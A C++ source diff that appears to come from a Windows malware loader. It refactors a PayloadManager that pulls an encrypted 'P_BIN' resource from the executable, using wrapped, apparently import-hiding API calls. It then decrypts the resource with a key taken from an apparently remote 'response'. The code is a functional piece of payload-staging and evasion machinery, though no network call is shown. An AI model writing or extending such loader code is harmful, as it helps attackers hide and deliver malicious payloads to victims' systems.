@@ -5,46 +5,48 @@
 #include "Cryptography.hpp"
 
 PayloadManager::PayloadManager() {
-    this->rawData = this->LoadRawData();
+    this->encryptedData = this->LoadRawData();
 }
 
-pair<BYTE*, DWORD> PayloadManager::LoadRawData() {
+vector<BYTE>* PayloadManager::LoadRawData() {
     RunImp* dImp = RunImp::GetInstance();
 
     HMODULE m_hInstance = dImp->dGetModuleHandleA(NULL);
     HRSRC hResource = FindResource(m_hInstance, MAKEINTRESOURCE(IDR_P_BIN1), "P_BIN");
 
     if (!hResource) {
-        return make_pair(nullptr, 0x0);
+        return nullptr;
     }
 
     HGLOBAL hLoadedResource = dImp->dLoadResource(m_hInstance, hResource);
 
     if (!hLoadedResource) {
-        return make_pair(nullptr, 0x0);
+        return nullptr;
     }
 
     LPVOID pLockedResource = dImp->dLockResource(hLoadedResource);
 
     if (!pLockedResource) {
-        return make_pair(nullptr, 0x0);
+        return nullptr;
     }
 
     DWORD dwResourceSize = dImp->dSizeofResource(m_hInstance, hResource);
 
     if (!dwResourceSize) {
-        return make_pair(nullptr, 0x0);
+        return nullptr;
     }
 
-    return make_pair((BYTE*)pLockedResource, dwResourceSize);
+    vector<BYTE>* data = new vector<BYTE>(plusaes::get_padded_encrypted_size(dwResourceSize));
+    memcpy(&data->data()[0], pLockedResource, dwResourceSize);
+
+    return data;
 }
 
-pair<BYTE*, DWORD> PayloadManager::GetDecryptedPayload(string response) {
+vector<BYTE>* PayloadManager::GetDecryptedPayload(string response) {
     DecryptKey key = Cryptography::GetKeyFromResponse(response);
     Cryptography c(key);
 
-    BYTE* decrypted = new BYTE[this->rawData.second]();
-    c.Decrypt(this->rawData.first, this->rawData.second, decrypted);
+    vector<BYTE>* decrypted = c.Decrypt(this->encryptedData);
 
-    return make_pair(decrypted, this->rawData.second);
+    return decrypted;
 }
